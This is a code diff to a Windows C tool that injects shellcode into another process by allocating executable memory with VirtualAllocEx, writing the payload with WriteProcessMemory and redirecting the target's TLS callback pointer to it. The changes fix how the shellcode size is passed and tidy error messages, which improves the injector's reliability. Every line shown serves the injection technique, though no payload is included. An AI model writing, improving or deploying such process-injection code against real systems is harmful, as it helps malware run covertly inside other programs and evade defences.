@@ -36,7 +36,7 @@ BYTE* ReadDataFromFile(WCHAR* FileName);
 BOOL StartExecutable(WCHAR* ExecutablePath, PROCESS_INFO* ProcessInfo, DWORD CreationFlag);
 void ResumeProcess(HANDLE hThread);
 void GetMainModuleInfo(DWORD PID, MODULE_INFO* ProcessInfo);
-int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleInfo, BYTE* ShellCode);
+int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleInfo, BYTE* ShellCode,DWORD ShellCodeSize);
 PIMAGE_NT_HEADERS  GetNTHeaders(DWORD64 dwImageBase);
 PLOADED_IMAGE  GetLoadedImage(DWORD64 dwImageBase);
 char* GetDLLName(DWORD64 dwImageBase, IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor);
@@ -372,7 +372,7 @@ void GetMainModuleInfo(DWORD PID, MODULE_INFO* ProcessInfo)
 
 }
 
-int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleInfo,BYTE* ShellCode) {
+int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleInfo,BYTE* ShellCode,DWORD ShellCodeSize) {
 
     DWORD NumberOfElementToGetFromTLSArray = 15;;
     DWORD OldProtection = 0;
@@ -408,24 +408,23 @@ int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleIn
 
         Status = VirtualProtectEx(hProcess, (BYTE*)TLSConfig->AddressOfCallBacks,  sizeof(DWORD), PAGE_EXECUTE_READWRITE, &OldProtection);
         if (!Status) {
-            printf("Failed to chang  Memory protection in process PID %d  Error Code is0x%x\n", PID, GetLastError());
+            printf("Failed to chang  Memory protection in process PID %d  Error Code is 0x%x\n", PID, GetLastError());
             return -1;
         }
 
-        ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, strlen((const char*)ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (!ShelCodeAddress) {
-            printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
+            printf("Failed to Allocate Memory in process PID %d  Error Code is 0x%x\n", PID, GetLastError());
             return -1;
         }
 
-        printf("the ShelCodeAddress at  %p\n", ShelCodeAddress);
-        Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), &written);
+        printf("the ShellCode Address at  %p\n", ShelCodeAddress);
+        Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, ShellCodeSize, &written);
         if (!Status) {
             printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
             return -1;
         }
 
-        ///DWORD LoadLibraryAddr = (DWORD)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");
 
         Status = WriteProcessMemory(hProcess, (BYTE*)TLSConfig->AddressOfCallBacks, &ShelCodeAddress, sizeof(DWORD), &written);       
         if (!Status) {
